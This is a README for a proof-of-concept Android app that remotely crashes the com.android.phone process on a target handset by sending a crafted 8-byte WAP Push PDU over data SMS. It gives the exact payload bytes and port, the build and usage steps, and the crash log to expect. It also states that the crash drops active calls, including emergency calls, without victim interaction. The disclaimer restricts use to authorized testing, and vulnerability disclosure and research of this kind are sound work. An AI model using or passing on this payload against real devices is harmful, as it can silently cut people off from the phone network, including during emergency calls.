# WAP Push Remote Modem Crash (PoC)

Proof-of-concept Android app that sends a crafted 8-byte WAP Push PDU over SMS to a
target handset. The malformed PDU triggers a `NegativeArraySizeException` in
`WapPushOverSms.decodeWapPdu`, which goes uncaught in `InboundSmsHandler` and kills
`com.android.phone` on the receiving device — dropping any active call, including
emergency calls, with no interaction from the victim.

**Full writeup: https://smsofdeath.com/**

## Payload

```
01 06 88 80 80 80 00 BE   → sent as a data SMS to port 2948
```

## Build

### On Linux/Mac
```
./gradlew assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk`

Requires an Android SDK. Create `local.properties` with your SDK path (Android Studio
does this automatically):

```
sdk.dir=/path/to/Android/sdk
```

### Using GitHub Codespaces

Create codespaces based on the configuration.
Wait for Codespace to get booted up and run it's script.
Run:
```
chmod +x gradlew
./gradlew assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk` (Right Click and download)

Requires an Android SDK. ( 'setup-android.sh' Script handles it)

## Use

Install on a sender device, enter (or auto-fill from an active SIM) the target number,
pick the sending SIM, and tap **SEND CRASH SMS**. Observe on the target:

```
adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'
```

Expected: `FATAL EXCEPTION` in `com.android.phone` within ~1–2s and a PID change for
that process, with a brief loss of signal.

- `minSdk` 30, `targetSdk`/`compileSdk` 35.
- Requires `SEND_SMS`, `READ_PHONE_NUMBERS`, `READ_PHONE_STATE`.

## Disclaimer

For authorized security research and testing on devices you own or have explicit
permission to test. Do not use against systems or people without consent.
